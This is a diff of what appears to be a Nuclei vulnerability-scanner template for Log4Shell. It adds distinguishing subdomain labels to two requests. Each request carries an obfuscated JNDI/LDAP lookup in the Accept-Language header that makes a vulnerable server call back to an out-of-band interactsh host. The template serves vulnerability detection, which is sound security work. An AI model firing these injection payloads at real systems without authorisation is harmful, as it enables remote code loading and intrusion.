@@ -16,12 +16,12 @@ requests:
       - |
         GET /portal/info.jsp HTTP/1.1
         Host: {{Hostname}}
-        Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}}
+        Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.horia.{{interactsh-url}}}
 
       - |
         GET /portal/info.jsp HTTP/1.1
         Host: {{Hostname}}
-        Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/127.0.0.1#{{Host}}.{{interactsh-url}}}
+        Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/127.0.0.1#{{Host}}.horib.{{interactsh-url}}}
 
     matchers-condition: and
     matchers:
